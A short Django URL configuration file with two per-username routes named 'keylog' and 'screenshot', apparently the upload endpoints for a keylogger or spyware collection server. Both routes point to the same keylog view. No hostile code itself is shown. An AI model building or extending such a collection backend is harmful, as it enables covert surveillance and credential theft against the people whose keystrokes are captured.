"""submit URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/1.10/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.conf.urls import url, include
    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
"""
from django.conf.urls import url
from django.contrib import admin

from . import views

# TODO: To add a different page to redirect by adding a $ to the end of the url
# TODO: Or simply try to create an `API` - the real one

urlpatterns = [
    url(r'^(?P<username>[\w.@+-]+)/keylog/', views.keylog),

    url(r'^(?P<username>[\w.@+-]+)/screenshot/', views.keylog),
]